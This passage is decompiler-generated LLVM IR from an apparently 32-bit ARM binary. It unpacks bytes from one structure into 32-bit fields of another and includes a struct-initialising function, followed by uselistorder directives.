  %v2_156b8 = inttoptr i32 %v1_156b8 to i8*
  %v3_156b8 = load i8, i8* %v2_156b8, align 1
  %v4_156b8 = zext i8 %v3_156b8 to i32
  %v4_156bc = mul nuw nsw i32 %v4_156b0, 65536
  %v5_156bc = or i32 %v4_156bc, %v5_156b4
  %v4_156c0 = mul nuw i32 %v4_156b8, 16777216
  %v5_156c0 = or i32 %v5_156bc, %v4_156c0
  store i32 %v5_156c0, i32* %r3.global-to-local, align 4
  %v1_156c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_156c4 = add i32 %v1_156c4, 52
  %v3_156c4 = inttoptr i32 %v2_156c4 to i32*
  store i32 %v5_156c0, i32* %v3_156c4, align 4
  %v0_156c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_156c8 = add i32 %v0_156c8, 57
  %v2_156c8 = inttoptr i32 %v1_156c8 to i8*
  %v3_156c8 = load i8, i8* %v2_156c8, align 1
  %v4_156c8 = zext i8 %v3_156c8 to i32
  %v1_156cc = add i32 %v0_156c8, 56
  %v2_156cc = inttoptr i32 %v1_156cc to i8*
  %v3_156cc = load i8, i8* %v2_156cc, align 1
  %v4_156cc = zext i8 %v3_156cc to i32
  %v1_156d0 = add i32 %v0_156c8, 60
  %v2_156d0 = inttoptr i32 %v1_156d0 to i8*
  %v3_156d0 = load i8, i8* %v2_156d0, align 1
  %v4_156d0 = zext i8 %v3_156d0 to i32
  store i32 %v4_156d0, i32* %r3.global-to-local, align 4
  %v1_156d4 = add i32 %v0_156c8, 61
  %v2_156d4 = inttoptr i32 %v1_156d4 to i8*
  %v3_156d4 = load i8, i8* %v2_156d4, align 1
  %v4_156d4 = zext i8 %v3_156d4 to i32
  %v1_156d8 = add i32 %v0_156c8, 58
  %v2_156d8 = inttoptr i32 %v1_156d8 to i8*
  %v3_156d8 = load i8, i8* %v2_156d8, align 1
  %v4_156d8 = zext i8 %v3_156d8 to i32
  %v1_156dc = add i32 %v0_156c8, 62
  %v2_156dc = inttoptr i32 %v1_156dc to i8*
  %v3_156dc = load i8, i8* %v2_156dc, align 1
  %v4_156dc = zext i8 %v3_156dc to i32
  %v1_156e0 = add i32 %v0_156c8, 59
  %v2_156e0 = inttoptr i32 %v1_156e0 to i8*
  %v3_156e0 = load i8, i8* %v2_156e0, align 1
  %v4_156e0 = zext i8 %v3_156e0 to i32
  %v4_156e4 = mul nuw nsw i32 %v4_156c8, 256
  %v5_156e4 = or i32 %v4_156cc, %v4_156e4
  %v4_156e8 = mul nuw nsw i32 %v4_156d4, 256
  %v5_156e8 = or i32 %v4_156e8, %v4_156d0
  store i32 %v5_156e8, i32* %r3.global-to-local, align 4
  %v1_156ec = add i32 %v0_156c8, 63
  %v2_156ec = inttoptr i32 %v1_156ec to i8*
  %v3_156ec = load i8, i8* %v2_156ec, align 1
  %v4_156ec = zext i8 %v3_156ec to i32
  %v4_156f0 = mul nuw nsw i32 %v4_156d8, 65536
  %v5_156f0 = or i32 %v4_156f0, %v5_156e4
  %v4_156f4 = mul nuw nsw i32 %v4_156dc, 65536
  %v5_156f4 = or i32 %v4_156f4, %v5_156e8
  %v4_156f8 = mul nuw i32 %v4_156ec, 16777216
  %v5_156f8 = or i32 %v5_156f4, %v4_156f8
  %v4_156fc = mul nuw i32 %v4_156e0, 16777216
  %v5_156fc = or i32 %v5_156f0, %v4_156fc
  store i32 %v5_156f8, i32* %r3.global-to-local, align 4
  %v1_1570c = load i32, i32* %r7.global-to-local, align 4
  %v2_1570c = add i32 %v1_1570c, 56
  %v3_1570c = inttoptr i32 %v2_1570c to i32*
  store i32 %v5_156fc, i32* %v3_1570c, align 4
  %v0_15710 = load i32, i32* %r3.global-to-local, align 4
  %v1_15710 = load i32, i32* %r7.global-to-local, align 4
  %v2_15710 = add i32 %v1_15710, 60
  %v3_15710 = inttoptr i32 %v2_15710 to i32*
  store i32 %v0_15710, i32* %v3_15710, align 4
  %v0_15714 = load i32, i32* %r4.global-to-local, align 4
  %v1_15714 = add i32 %v0_15714, 65
  %v2_15714 = inttoptr i32 %v1_15714 to i8*
  %v3_15714 = load i8, i8* %v2_15714, align 1
  %v4_15714 = zext i8 %v3_15714 to i32
  %v1_15718 = add i32 %v0_15714, 64
  %v2_15718 = inttoptr i32 %v1_15718 to i8*
  %v3_15718 = load i8, i8* %v2_15718, align 1
  %v4_15718 = zext i8 %v3_15718 to i32
  store i32 %v4_15718, i32* %r3.global-to-local, align 4
  %v1_1571c = add i32 %v0_15714, 66
  %v2_1571c = inttoptr i32 %v1_1571c to i8*
  %v3_1571c = load i8, i8* %v2_1571c, align 1
  %v4_1571c = zext i8 %v3_1571c to i32
  %v4_15720 = mul nuw nsw i32 %v4_15714, 256
  %v5_15720 = or i32 %v4_15718, %v4_15720
  store i32 %v5_15720, i32* %r3.global-to-local, align 4
  %v1_15724 = add i32 %v0_15714, 67
  %v2_15724 = inttoptr i32 %v1_15724 to i8*
  %v3_15724 = load i8, i8* %v2_15724, align 1
  %v4_15724 = zext i8 %v3_15724 to i32
  %v4_15728 = mul nuw nsw i32 %v4_1571c, 65536
  %v5_15728 = or i32 %v4_15728, %v5_15720
  %v4_1572c = mul nuw i32 %v4_15724, 16777216
  %v5_1572c = or i32 %v5_15728, %v4_1572c
  store i32 %v5_1572c, i32* %r3.global-to-local, align 4
  %v1_15730 = load i32, i32* %r7.global-to-local, align 4
  %v2_15730 = add i32 %v1_15730, 64
  %v3_15730 = inttoptr i32 %v2_15730 to i32*
  store i32 %v5_1572c, i32* %v3_15730, align 4
  %v0_15734 = load i32, i32* %r4.global-to-local, align 4
  %v1_15734 = add i32 %v0_15734, 73
  %v2_15734 = inttoptr i32 %v1_15734 to i8*
  %v3_15734 = load i8, i8* %v2_15734, align 1
  %v4_15734 = zext i8 %v3_15734 to i32
  %v1_15738 = add i32 %v0_15734, 72
  %v2_15738 = inttoptr i32 %v1_15738 to i8*
  %v3_15738 = load i8, i8* %v2_15738, align 1
  %v4_15738 = zext i8 %v3_15738 to i32
  store i32 %v4_15738, i32* %r3.global-to-local, align 4
  %v1_1573c = add i32 %v0_15734, 74
  %v2_1573c = inttoptr i32 %v1_1573c to i8*
  %v3_1573c = load i8, i8* %v2_1573c, align 1
  %v4_1573c = zext i8 %v3_1573c to i32
  %v4_15740 = mul nuw nsw i32 %v4_15734, 256
  %v5_15740 = or i32 %v4_15738, %v4_15740
  store i32 %v5_15740, i32* %r3.global-to-local, align 4
  %v1_15744 = add i32 %v0_15734, 75
  %v2_15744 = inttoptr i32 %v1_15744 to i8*
  %v3_15744 = load i8, i8* %v2_15744, align 1
  %v4_15744 = zext i8 %v3_15744 to i32
  %v4_15748 = mul nuw nsw i32 %v4_1573c, 65536
  %v5_15748 = or i32 %v4_15748, %v5_15740
  %v4_1574c = mul nuw i32 %v4_15744, 16777216
  %v5_1574c = or i32 %v5_15748, %v4_1574c
  store i32 %v5_1574c, i32* %r3.global-to-local, align 4
  %v1_15750 = load i32, i32* %r7.global-to-local, align 4
  %v2_15750 = add i32 %v1_15750, 72
  %v3_15750 = inttoptr i32 %v2_15750 to i32*
  store i32 %v5_1574c, i32* %v3_15750, align 4
  %v0_15754 = load i32, i32* %r4.global-to-local, align 4
  %v1_15754 = add i32 %v0_15754, 81
  %v2_15754 = inttoptr i32 %v1_15754 to i8*
  %v3_15754 = load i8, i8* %v2_15754, align 1
  %v4_15754 = zext i8 %v3_15754 to i32
  %v1_15758 = add i32 %v0_15754, 80
  %v2_15758 = inttoptr i32 %v1_15758 to i8*
  %v3_15758 = load i8, i8* %v2_15758, align 1
  %v4_15758 = zext i8 %v3_15758 to i32
  store i32 %v4_15758, i32* %r3.global-to-local, align 4
  %v1_1575c = add i32 %v0_15754, 82
  %v2_1575c = inttoptr i32 %v1_1575c to i8*
  %v3_1575c = load i8, i8* %v2_1575c, align 1
  %v4_1575c = zext i8 %v3_1575c to i32
  %v4_15760 = mul nuw nsw i32 %v4_15754, 256
  %v5_15760 = or i32 %v4_15758, %v4_15760
  store i32 %v5_15760, i32* %r3.global-to-local, align 4
  %v1_15764 = add i32 %v0_15754, 83
  %v2_15764 = inttoptr i32 %v1_15764 to i8*
  %v3_15764 = load i8, i8* %v2_15764, align 1
  %v4_15764 = zext i8 %v3_15764 to i32
  %v4_15768 = mul nuw nsw i32 %v4_1575c, 65536
  %v5_15768 = or i32 %v4_15768, %v5_15760
  %v4_1576c = mul nuw i32 %v4_15764, 16777216
  %v5_1576c = or i32 %v5_15768, %v4_1576c
  store i32 %v5_1576c, i32* %r3.global-to-local, align 4
  %v1_15770 = load i32, i32* %r7.global-to-local, align 4
  %v2_15770 = add i32 %v1_15770, 80
  %v3_15770 = inttoptr i32 %v2_15770 to i32*
  store i32 %v5_1576c, i32* %v3_15770, align 4
  %v0_15774 = load i32, i32* %r4.global-to-local, align 4
  %v1_15774 = add i32 %v0_15774, 69
  %v2_15774 = inttoptr i32 %v1_15774 to i8*
  %v3_15774 = load i8, i8* %v2_15774, align 1
  %v4_15774 = zext i8 %v3_15774 to i32
  %v1_15778 = add i32 %v0_15774, 68
  %v2_15778 = inttoptr i32 %v1_15778 to i8*
  %v3_15778 = load i8, i8* %v2_15778, align 1
  %v4_15778 = zext i8 %v3_15778 to i32
  store i32 %v4_15778, i32* %r3.global-to-local, align 4
  %v1_1577c = add i32 %v0_15774, 70
  %v2_1577c = inttoptr i32 %v1_1577c to i8*
  %v3_1577c = load i8, i8* %v2_1577c, align 1
  %v4_1577c = zext i8 %v3_1577c to i32
  %v4_15780 = mul nuw nsw i32 %v4_15774, 256
  %v5_15780 = or i32 %v4_15778, %v4_15780
  store i32 %v5_15780, i32* %r3.global-to-local, align 4
  %v1_15784 = add i32 %v0_15774, 71
  %v2_15784 = inttoptr i32 %v1_15784 to i8*
  %v3_15784 = load i8, i8* %v2_15784, align 1
  %v4_15784 = zext i8 %v3_15784 to i32
  %v4_15788 = mul nuw nsw i32 %v4_1577c, 65536
  %v5_15788 = or i32 %v4_15788, %v5_15780
  %v4_1578c = mul nuw i32 %v4_15784, 16777216
  %v5_1578c = or i32 %v5_15788, %v4_1578c
  store i32 %v5_1578c, i32* %r3.global-to-local, align 4
  %v1_15790 = load i32, i32* %r7.global-to-local, align 4
  %v2_15790 = add i32 %v1_15790, 68
  %v3_15790 = inttoptr i32 %v2_15790 to i32*
  store i32 %v5_1578c, i32* %v3_15790, align 4
  %v0_15794 = load i32, i32* %r4.global-to-local, align 4
  %v1_15794 = add i32 %v0_15794, 77
  %v2_15794 = inttoptr i32 %v1_15794 to i8*
  %v3_15794 = load i8, i8* %v2_15794, align 1
  %v4_15794 = zext i8 %v3_15794 to i32
  %v1_15798 = add i32 %v0_15794, 76
  %v2_15798 = inttoptr i32 %v1_15798 to i8*
  %v3_15798 = load i8, i8* %v2_15798, align 1
  %v4_15798 = zext i8 %v3_15798 to i32
  store i32 %v4_15798, i32* %r3.global-to-local, align 4
  %v1_1579c = add i32 %v0_15794, 78
  %v2_1579c = inttoptr i32 %v1_1579c to i8*
  %v3_1579c = load i8, i8* %v2_1579c, align 1
  %v4_1579c = zext i8 %v3_1579c to i32
  %v4_157a0 = mul nuw nsw i32 %v4_15794, 256
  %v5_157a0 = or i32 %v4_15798, %v4_157a0
  store i32 %v5_157a0, i32* %r3.global-to-local, align 4
  %v1_157a4 = add i32 %v0_15794, 79
  %v2_157a4 = inttoptr i32 %v1_157a4 to i8*
  %v3_157a4 = load i8, i8* %v2_157a4, align 1
  %v4_157a4 = zext i8 %v3_157a4 to i32
  %v4_157a8 = mul nuw nsw i32 %v4_1579c, 65536
  %v5_157a8 = or i32 %v4_157a8, %v5_157a0
  %v4_157ac = mul nuw i32 %v4_157a4, 16777216
  %v5_157ac = or i32 %v5_157a8, %v4_157ac
  store i32 %v5_157ac, i32* %r3.global-to-local, align 4
  %v1_157b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_157b0 = add i32 %v1_157b0, 76
  %v3_157b0 = inttoptr i32 %v2_157b0 to i32*
  store i32 %v5_157ac, i32* %v3_157b0, align 4
  %v0_157b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_157b4 = add i32 %v0_157b4, 85
  %v2_157b4 = inttoptr i32 %v1_157b4 to i8*
  %v3_157b4 = load i8, i8* %v2_157b4, align 1
  %v4_157b4 = zext i8 %v3_157b4 to i32
  %v1_157b8 = add i32 %v0_157b4, 84
  %v2_157b8 = inttoptr i32 %v1_157b8 to i8*
  %v3_157b8 = load i8, i8* %v2_157b8, align 1
  %v4_157b8 = zext i8 %v3_157b8 to i32
  store i32 %v4_157b8, i32* %r3.global-to-local, align 4
  %v1_157bc = add i32 %v0_157b4, 86
  %v2_157bc = inttoptr i32 %v1_157bc to i8*
  %v3_157bc = load i8, i8* %v2_157bc, align 1
  %v4_157bc = zext i8 %v3_157bc to i32
  %v4_157c0 = mul nuw nsw i32 %v4_157b4, 256
  %v5_157c0 = or i32 %v4_157b8, %v4_157c0
  store i32 %v5_157c0, i32* %r3.global-to-local, align 4
  %v1_157c4 = add i32 %v0_157b4, 87
  %v2_157c4 = inttoptr i32 %v1_157c4 to i8*
  %v3_157c4 = load i8, i8* %v2_157c4, align 1
  %v4_157c4 = zext i8 %v3_157c4 to i32
  %v4_157c8 = mul nuw nsw i32 %v4_157bc, 65536
  %v5_157c8 = or i32 %v4_157c8, %v5_157c0
  %v4_157cc = mul nuw i32 %v4_157c4, 16777216
  %v5_157cc = or i32 %v5_157c8, %v4_157cc
  store i32 %v5_157cc, i32* %r3.global-to-local, align 4
  %v1_157d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_157d0 = add i32 %v1_157d0, 84
  %v3_157d0 = inttoptr i32 %v2_157d0 to i32*
  store i32 %v5_157cc, i32* %v3_157d0, align 4
  ret i32 %v4_156d4

; uselistorder directives
  uselistorder i32 %v4_156d4, { 1, 0 }
  uselistorder i32 %v0_156c8, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15658, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15608, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_15528, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %tmp, { 6, 5, 3, 4, 2, 1, 0, 7 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 69, { 1, 0 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i32 80, { 1, 2, 5, 3, 4, 0, 6 }
  uselistorder i32 59, { 1, 2, 0 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 55, { 2, 4, 0, 3, 1 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 53, { 1, 2, 0, 3 }
  uselistorder i32 51, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 47, { 4, 5, 6, 7, 0, 8, 1, 9, 2, 10, 11, 3 }
  uselistorder i32 50, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 49, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 45, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 39, { 5, 6, 0, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i32 35, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 38, { 4, 3, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11 }
  uselistorder i32 34, { 5, 0, 1, 6, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 37, { 3, 0, 4, 1, 5, 6, 7, 8, 2, 9 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 30, { 5, 0, 9, 4, 1, 6, 2, 7, 3, 8, 10 }
  uselistorder i32 29, { 7, 1, 0, 8, 9, 5, 2, 3, 4, 6 }
  uselistorder i32 26, { 5, 0, 1, 2, 6, 3, 7, 4, 8, 9 }
  uselistorder i32 25, { 12, 24, 25, 3, 0, 4, 13, 5, 14, 6, 15, 11, 16, 17, 18, 1, 19, 7, 20, 2, 21, 8, 9, 22, 10, 23, 26, 27 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 12, 10, 5 }
  uselistorder i32 22, { 11, 1, 16, 2, 3, 4, 5, 0, 6, 12, 7, 13, 8, 14, 17, 15, 9, 10, 18 }
  uselistorder i32 21, { 8, 3, 1, 9, 4, 10, 5, 11, 6, 12, 13, 14, 7, 0, 15, 2, 16 }
  uselistorder i32 19, { 8, 13, 14, 15, 4, 9, 1, 5, 10, 6, 11, 7, 12, 0, 19, 16, 2, 17, 3, 18 }
  uselistorder i32 18, { 13, 18, 19, 20, 3, 0, 4, 1, 5, 14, 6, 15, 7, 16, 12, 8, 2, 17, 21, 9, 22, 10, 23, 11, 24 }
  uselistorder i32 17, { 12, 15, 0, 4, 31, 32, 5, 33, 34, 6, 1, 30, 13, 14, 7, 16, 8, 17, 9, 18, 10, 19, 11, 20, 21, 2, 22, 23, 24, 3, 25, 26, 27, 28, 29 }
  uselistorder i32 6, { 41, 44, 14, 15, 89, 16, 2, 17, 42, 0, 83, 18, 84, 43, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 4, 30, 31, 32, 33, 34, 5, 35, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 9, 57, 58, 59, 36, 60, 10, 61, 62, 63, 37, 64, 11, 65, 66, 67, 38, 68, 69, 70, 71, 72, 39, 73, 12, 74, 75, 76, 77, 78, 79, 40, 80, 13, 81, 1, 82, 85, 86, 87, 88 }
  uselistorder i32 96, { 1, 0, 2, 3 }
}

define i32 @function_157dc(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_157dc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_157dc = load i32, i32* @r4, align 4
  store i32 %v3_157dc, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_157f4 = inttoptr i32 %arg2 to i8*
  %v3_157f4 = call i32 @function_13c90(i8* %v2_157f4, i32 0)
  store i32 %v3_157f4, i32* %r0.global-to-local, align 4
  %v0_157f8 = load i32, i32* %r5.global-to-local, align 4
  %v1_157f8 = inttoptr i32 %v0_157f8 to i32*
  %v2_157f8 = load i32, i32* %v1_157f8, align 4
  store i32 %v2_157f8, i32* %r3.global-to-local, align 4
  %v1_157fc = add i32 %v0_157f8, 4
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  store i32 %v3_157fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15804 = load i32, i32* %r6.global-to-local, align 4
  %v1_15804 = inttoptr i32 %v0_15804 to i32*
  store i32 %v2_157f8, i32* %v1_15804, align 4
  %v3_15804 = add i32 %v0_15804, 4
  %v4_15804 = inttoptr i32 %v3_15804 to i32*
  %v5_15804 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15804, i32* %v4_15804, align 4
  %v0_15808 = load i32, i32* %r2.global-to-local, align 4
  %v1_15808 = load i32, i32* %r6.global-to-local, align 4
  %v2_15808 = add i32 %v1_15808, 12
  %v3_15808 = inttoptr i32 %v2_15808 to i32*
  store i32 %v0_15808, i32* %v3_15808, align 4
  %v0_1580c = load i32, i32* %r5.global-to-local, align 4
  %v1_1580c = add i32 %v0_1580c, 9
  %v2_1580c = inttoptr i32 %v1_1580c to i8*
  %v3_1580c = load i8, i8* %v2_1580c, align 1
  %v4_1580c = zext i8 %v3_1580c to i32
  store i32 %v4_1580c, i32* %r2.global-to-local, align 4
  %v1_15810 = add i32 %v0_1580c, 8
  %v2_15810 = inttoptr i32 %v1_15810 to i8*
  %v3_15810 = load i8, i8* %v2_15810, align 1
  %v4_15810 = zext i8 %v3_15810 to i32
  %v4_15814 = mul nuw nsw i32 %v4_1580c, 256
  %v5_15814 = or i32 %v4_15810, %v4_15814
  store i32 %v5_15814, i32* %r3.global-to-local, align 4
  %v1_15818 = load i32, i32* %r6.global-to-local, align 4
  %v2_15818 = add i32 %v1_15818, 16
  %v3_15818 = inttoptr i32 %v2_15818 to i32*
  store i32 %v5_15814, i32* %v3_15818, align 4
  %v0_1581c = load i32, i32* %r5.global-to-local, align 4
  %v1_1581c = add i32 %v0_1581c, 11
  %v2_1581c = inttoptr i32 %v1_1581c to i8*
  %v3_1581c = load i8, i8* %v2_1581c, align 1
  %v4_1581c = zext i8 %v3_1581c to i32
  store i32 %v4_1581c, i32* %r2.global-to-local, align 4
  %v1_15820 = add i32 %v0_1581c, 10
  %v2_15820 = inttoptr i32 %v1_15820 to i8*
  %v3_15820 = load i8, i8* %v2_15820, align 1
  %v4_15820 = zext i8 %v3_15820 to i32
  %v4_15824 = mul nuw nsw i32 %v4_1581c, 256
  %v5_15824 = or i32 %v4_15820, %v4_15824
  store i32 %v5_15824, i32* %r3.global-to-local, align 4
  %v1_15828 = load i32, i32* %r6.global-to-local, align 4
  %v2_15828 = add i32 %v1_15828, 20
  %v3_15828 = inttoptr i32 %v2_15828 to i32*
  store i32 %v5_15824, i32* %v3_15828, align 4
  %v0_1582c = load i32, i32* %r5.global-to-local, align 4
  %v1_1582c = add i32 %v0_1582c, 13
  %v2_1582c = inttoptr i32 %v1_1582c to i8*
  %v3_1582c = load i8, i8* %v2_1582c, align 1
  %v4_1582c = zext i8 %v3_1582c to i32
  store i32 %v4_1582c, i32* %r2.global-to-local, align 4
  %v1_15830 = add i32 %v0_1582c, 12
  %v2_15830 = inttoptr i32 %v1_15830 to i8*
  %v3_15830 = load i8, i8* %v2_15830, align 1
  %v4_15830 = zext i8 %v3_15830 to i32
  %v4_15834 = mul nuw nsw i32 %v4_1582c, 256
  %v5_15834 = or i32 %v4_15830, %v4_15834
  store i32 %v5_15834, i32* %r3.global-to-local, align 4
  %v1_15838 = load i32, i32* %r6.global-to-local, align 4
  %v2_15838 = add i32 %v1_15838, 24
  %v3_15838 = inttoptr i32 %v2_15838 to i32*
  store i32 %v5_15834, i32* %v3_15838, align 4
  %v0_1583c = load i32, i32* %r5.global-to-local, align 4
  %v1_1583c = add i32 %v0_1583c, 20
  %v2_1583c = inttoptr i32 %v1_1583c to i32*
  %v3_1583c = load i32, i32* %v2_1583c, align 4
  store i32 %v3_1583c, i32* %r3.global-to-local, align 4
  %v1_15840 = add i32 %v0_1583c, 14
  %v2_15840 = inttoptr i32 %v1_15840 to i8*
  %v3_15840 = load i8, i8* %v2_15840, align 1
  %v4_15840 = zext i8 %v3_15840 to i32
  store i32 %v4_15840, i32* %r0.global-to-local, align 4
  %v1_15844 = add i32 %v0_1583c, 15
  %v2_15844 = inttoptr i32 %v1_15844 to i8*
  %v3_15844 = load i8, i8* %v2_15844, align 1
  %v4_15844 = zext i8 %v3_15844 to i32
  store i32 %v4_15844, i32* %ip.global-to-local, align 4
  %v1_15848 = add i32 %v0_1583c, 16
  %v2_15848 = inttoptr i32 %v1_15848 to i32*
  %v3_15848 = load i32, i32* %v2_15848, align 4
  store i32 %v3_15848, i32* %r1.global-to-local, align 4
  %v1_1584c = load i32, i32* %r6.global-to-local, align 4
  %v2_1584c = add i32 %v1_1584c, 44
  %v3_1584c = inttoptr i32 %v2_1584c to i32*
  store i32 %v3_1583c, i32* %v3_1584c, align 4
  %v0_15850 = load i32, i32* %r5.global-to-local, align 4
  %v1_15850 = add i32 %v0_15850, 24
  %v2_15850 = inttoptr i32 %v1_15850 to i32*
  %v3_15850 = load i32, i32* %v2_15850, align 4
  store i32 %v3_15850, i32* %r3.global-to-local, align 4
  %v1_15854 = load i32, i32* %r6.global-to-local, align 4
  %v2_15854 = add i32 %v1_15854, 48
  %v3_15854 = inttoptr i32 %v2_15854 to i32*
  store i32 %v3_15850, i32* %v3_15854, align 4
  %v0_15858 = load i32, i32* %r5.global-to-local, align 4
  %v1_15858 = add i32 %v0_15858, 28
  %v2_15858 = inttoptr i32 %v1_15858 to i32*
  %v3_15858 = load i32, i32* %v2_15858, align 4
  store i32 %v3_15858, i32* %r3.global-to-local, align 4
  %v1_1585c = load i32, i32* %r6.global-to-local, align 4
  %v2_1585c = add i32 %v1_1585c, 52
  %v3_1585c = inttoptr i32 %v2_1585c to i32*
  store i32 %v3_15858, i32* %v3_1585c, align 4
  %v0_15860 = load i32, i32* %r5.global-to-local, align 4
  %v1_15860 = add i32 %v0_15860, 32
  %v2_15860 = inttoptr i32 %v1_15860 to i32*
  %v3_15860 = load i32, i32* %v2_15860, align 4
  store i32 %v3_15860, i32* %r3.global-to-local, align 4
  %v1_15864 = load i32, i32* %r6.global-to-local, align 4
  %v2_15864 = add i32 %v1_15864, 56
  %v3_15864 = inttoptr i32 %v2_15864 to i32*
  store i32 %v3_15860, i32* %v3_15864, align 4
  %v0_15868 = load i32, i32* %r5.global-to-local, align 4
  %v1_15868 = add i32 %v0_15868, 40
  %v2_15868 = inttoptr i32 %v1_15868 to i32*
  %v3_15868 = load i32, i32* %v2_15868, align 4
  store i32 %v3_15868, i32* %r3.global-to-local, align 4
  %v1_1586c = load i32, i32* %r6.global-to-local, align 4
  %v2_1586c = add i32 %v1_1586c, 64
  %v3_1586c = inttoptr i32 %v2_1586c to i32*
  store i32 %v3_15868, i32* %v3_1586c, align 4
  %v0_15870 = load i32, i32* %r5.global-to-local, align 4
  %v1_15870 = add i32 %v0_15870, 48
  %v2_15870 = inttoptr i32 %v1_15870 to i32*
  %v3_15870 = load i32, i32* %v2_15870, align 4
  store i32 %v3_15870, i32* %r3.global-to-local, align 4
  %v1_15874 = load i32, i32* %r6.global-to-local, align 4
  %v2_15874 = add i32 %v1_15874, 72
  %v3_15874 = inttoptr i32 %v2_15874 to i32*
  store i32 %v3_15870, i32* %v3_15874, align 4
  %v0_15878 = load i32, i32* %r5.global-to-local, align 4
  %v1_15878 = add i32 %v0_15878, 36
  %v2_15878 = inttoptr i32 %v1_15878 to i32*
  %v3_15878 = load i32, i32* %v2_15878, align 4
  store i32 %v3_15878, i32* %r3.global-to-local, align 4
  %v1_1587c = load i32, i32* %r6.global-to-local, align 4
  %v2_1587c = add i32 %v1_1587c, 60
  %v3_1587c = inttoptr i32 %v2_1587c to i32*
  store i32 %v3_15878, i32* %v3_1587c, align 4
  %v0_15880 = load i32, i32* %r5.global-to-local, align 4
  %v1_15880 = add i32 %v0_15880, 44
  %v2_15880 = inttoptr i32 %v1_15880 to i32*
  %v3_15880 = load i32, i32* %v2_15880, align 4
  store i32 %v3_15880, i32* %r3.global-to-local, align 4
  %v0_15884 = load i32, i32* %r0.global-to-local, align 4
  %v1_15884 = load i32, i32* %ip.global-to-local, align 4
  %v4_15884 = mul i32 %v1_15884, 256
  %v5_15884 = or i32 %v4_15884, %v0_15884
  store i32 %v5_15884, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_1588c = load i32, i32* %r6.global-to-local, align 4
  %v2_1588c = add i32 %v1_1588c, 28
  %v3_1588c = inttoptr i32 %v2_1588c to i32*
  store i32 %v5_15884, i32* %v3_1588c, align 4
  %v0_15890 = load i32, i32* %r1.global-to-local, align 4
  %v1_15890 = load i32, i32* %r6.global-to-local, align 4
  %v2_15890 = add i32 %v1_15890, 32
  %v3_15890 = inttoptr i32 %v2_15890 to i32*
  store i32 %v0_15890, i32* %v3_15890, align 4
  %v0_15894 = load i32, i32* %r2.global-to-local, align 4
  %v1_15894 = load i32, i32* %r6.global-to-local, align 4
  %v2_15894 = add i32 %v1_15894, 36
  %v3_15894 = inttoptr i32 %v2_15894 to i32*
  store i32 %v0_15894, i32* %v3_15894, align 4
  %v0_15898 = load i32, i32* %r3.global-to-local, align 4
  %v1_15898 = load i32, i32* %r6.global-to-local, align 4
  %v2_15898 = add i32 %v1_15898, 68
  %v3_15898 = inttoptr i32 %v2_15898 to i32*
  store i32 %v0_15898, i32* %v3_15898, align 4
  %v0_1589c = load i32, i32* %r5.global-to-local, align 4
  %v1_1589c = add i32 %v0_1589c, 52
  %v2_1589c = inttoptr i32 %v1_1589c to i32*
  %v3_1589c = load i32, i32* %v2_1589c, align 4
  store i32 %v3_1589c, i32* %r3.global-to-local, align 4
  %v1_158a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_158a0 = add i32 %v1_158a0, 76
  %v3_158a0 = inttoptr i32 %v2_158a0 to i32*
  store i32 %v3_1589c, i32* %v3_158a0, align 4
  %v2_158a4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158a4, i32* %r4.global-to-local, align 4
  ret i32 %v5_15884

; uselistorder directives
  uselistorder i32 %v0_1583c, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 76, { 2, 0, 1 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 3, 1, 2, 0, 4 }
